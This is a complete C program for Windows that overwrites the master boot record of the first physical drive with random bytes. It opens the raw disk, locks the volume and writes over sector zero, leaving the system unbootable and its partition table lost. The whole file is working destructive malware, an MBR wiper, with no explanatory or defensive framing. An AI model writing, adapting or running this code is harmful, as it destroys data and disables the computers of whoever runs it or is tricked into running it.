#include<Windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<time.h>



int main()
{
	HANDLE MBR;
	BYTE MBRsize[512] = { 0, };
	DWORD Write, Bytes;
	BYTE MBRs[512];

	srand(time(NULL));

	for (int i = 0; i < 512; i++)
	{
		MBRs[i] = rand() % 245 + 1;
	}
	memcpy(MBRsize, MBRs, sizeof(MBRs));
	
	MBR = CreateFile(TEXT("\\\\.\\PHYSICALDRIVE0"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (MBR == INVALID_HANDLE_VALUE)return 0;

	DeviceIoControl(MBR, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &Bytes, NULL);
	WriteFile(MBR, MBRs, sizeof(MBRs), &Write, NULL);
	DeviceIoControl(MBR, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &Bytes, NULL);
	CloseHandle(MBR);

	ExitProcess(-1);
	
	return 0;
}